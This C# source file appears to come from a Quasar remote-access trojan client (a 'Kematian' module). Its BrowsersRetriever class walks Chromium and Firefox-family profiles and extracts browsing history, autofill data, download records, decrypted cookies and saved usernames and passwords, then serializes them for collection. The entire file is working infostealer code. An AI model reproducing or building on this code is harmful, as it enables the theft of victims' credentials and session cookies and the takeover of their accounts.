﻿using System;
using System.Diagnostics;
using System.Collections.Generic;
using Quasar.Client.Kematian.Browsers.Helpers.JSON;
using Quasar.Client.Kematian.Browsers.Chromium.Autofill;
using Quasar.Client.Kematian.Browsers.Chromium.History;
using Quasar.Client.Kematian.Browsers.Chromium.Cookies;
using Quasar.Client.Kematian.Browsers.Chromium.Downloads;
using Quasar.Client.Kematian.Browsers.Gecko.History;
using Quasar.Client.Kematian.Browsers.Gecko.Passwords;
using Quasar.Client.Kematian.Browsers.Helpers.Structs;
using Quasar.Client.Kematian.Browsers.Helpers;
using Quasar.Client.Kematian.Browsers.Chromium.Passwords;

namespace Quasar.Client.Kematian.Browsers
{
    public class BrowsersRetriever
    {
        private readonly List<ChromiumBrowserPath> _chromiumBrowsers;
        private readonly List<GeckoBrowserPath> _geckoBrowsers;

        public BrowsersRetriever()
        {
            Crawler crawler = new Crawler();
            _chromiumBrowsers = crawler.GetChromiumBrowsers();
            _geckoBrowsers = crawler.GetGeckoBrowsers();
        }

        public string GetHistory()
        {
            try
            {
                var allHistory = new List<Dictionary<string, string>>();
                // Process Chromium browsers
                foreach (var browser in _chromiumBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        var history = HistoryChromium.GetHistoryChromium(profile.History);
                        foreach (var entry in history)
                        {
                            var newEntry = new Dictionary<string, string>
                            {
                                {"Url", entry.Url},
                                {"Title", entry.Title},
                                {"VisitCount", entry.VisitCount},
                                {"Date Last Viewed", entry.LastVisitTime}
                            };
                            allHistory.Add(newEntry);
                        }
                    }
                }
                // Process Gecko browsers
                foreach (var browser in _geckoBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        var history = HistoryGecko.GetHistoryGecko(profile.History);
                        foreach (var entry in history)
                        {
                            var newEntry = new Dictionary<string, string>
                            {
                                {"Url", entry.Url},
                                {"Title", entry.Title},
                                {"VisitCount", entry.VisitCount},
                                {"Date Last Viewed", entry.LastVisitTime}
                            };
                            allHistory.Add(newEntry);
                        }
                    }
                }
                // Serialize the dictionary list
                return allHistory.Count > 1000
                    ? Serializer.SerializeDataInBatches(allHistory, 1000)
                    : Serializer.SerializeData(allHistory);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error serializing data: {ex.Message}");
                return "[]";
            }
        }

        public string GetAutoFillData()
        {
            try
            {
                var allAutoFillData = new List<Dictionary<string, string>>();

                // Process Chromium browsers
                foreach (var browser in _chromiumBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        var autoFillData = Autofill.GetAutofillEntries(profile.WebData);
                        foreach (var entry in autoFillData)
                        {
                            var newEntry = new Dictionary<string, string>
                            {
                                {"Name", entry.Name},
                                {"Value", entry.Value},
                                {"Value_lower", entry.Value_lower},
                                {"Date_created", entry.Date_created},
                                {"Date_last_used", entry.Date_last_used},
                                {"Count", entry.Count}
                            };

                            allAutoFillData.Add(newEntry);
                        }
                    }
                }

                // Serialize the dictionary list
                return allAutoFillData.Count > 1000
                    ? Serializer.SerializeDataInBatches(allAutoFillData, 1000)
                    : Serializer.SerializeData(allAutoFillData);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error serializing data: {ex.Message}");
                return "[]";
            }
        }

        public string GetCookies()
        {
            try
            {
                var allCookies = new List<string>();
                // Process Chromium browsers
                foreach (var browser in _chromiumBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        var cookies = CookiesChromium.GetCookies(profile.Cookies, browser.LocalStatePath);
                        foreach (var cookie in cookies)
                        {
                            var netscapeCookie = $"{cookie.HostKey}\tTRUE\t{cookie.Path}\tFALSE\t{cookie.ExpiresUTC}\t{cookie.Name}\t{cookie.Value}";
                            allCookies.Add(netscapeCookie);
                        }
                    }
                }
                // Combine all cookies into a single string with new lines
                return string.Join(Environment.NewLine, allCookies);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error serializing data: {ex.Message}");
                return string.Empty;
            }
        }

        public string GetDownloads()
        {
            try
            {
                var allDownloads = new List<Dictionary<string, string>>();
                // Process Chromium browsers
                foreach (var browser in _chromiumBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        var downloads = DownloadsChromium.GetDownloadsChromium(profile.History);
                        foreach (var entry in downloads)
                        {
                            var newEntry = new Dictionary<string, string>
                            {
                                {"CurrentPath", entry.Current_path },
                                {"TargetPath", entry.Target_path },
                                {"StartTime", entry.Start_time },
                                {"ReceivedBytes", entry.Received_bytes },
                                {"TotalBytes", entry.Total_bytes },
                                {"DangerType", entry.Danger_type },
                                {"EndTime", entry.End_time },
                                {"Opened", entry.Opened },
                                {"LastAccessTime", entry.Last_access_time },
                                {"Referrer", entry.Referrer },
                                {"TabUrl", entry.Tab_url },
                                {"TabReferrerUrl", entry.Tab_referrer_url },
                                {"MimeType", entry.Mime_type },
                                {"OriginalMimeType", entry.Original_mime_type }
                            };

                            allDownloads.Add(newEntry);
                        }
                    }
                }
                return allDownloads.Count > 1000
                    ? Serializer.SerializeDataInBatches(allDownloads, 1000)
                    : Serializer.SerializeData(allDownloads);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error serializing data: {ex.Message}");
                return "[]";
            }
        }

        public string GetPasswords()
        {
            try
            {
                var allPasswords = new List<Dictionary<string, string>>();
                // Process Chromium browsers
                foreach (var browser in _chromiumBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        var passwords = PasswordsChromium.GetLogins(profile.LoginData, browser.LocalStatePath);
                        foreach (var entry in passwords)
                        {
                            var newEntry = new Dictionary<string, string>
                            {
                                {"Url", entry.Url},
                                {"Username", entry.Username},
                                {"Password", entry.Password}
                            };
                            allPasswords.Add(newEntry);
                        }
                    }
                }

                var geckoLogins = new PasswordsGecko();

                foreach (var browser in _geckoBrowsers)
                {
                    foreach (var profile in browser.Profiles)
                    {
                        var passwords = geckoLogins.GetLogins(profile.Path, profile.LoginsJson);
                        foreach (var entry in passwords)
                        {
                            var newEntry = new Dictionary<string, string>
                            {
                                {"Url", entry.Url},
                                {"Username", entry.Username},
                                {"Password", entry.Password}
                            };
                            allPasswords.Add(newEntry);
                        }
                    }
                }

                geckoLogins.Dispose();

                return allPasswords.Count > 1000
                    ? Serializer.SerializeDataInBatches(allPasswords, 1000)
                    : Serializer.SerializeData(allPasswords);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Error serializing data: {ex.Message}");
                return "[]";
            }
        }
    }
}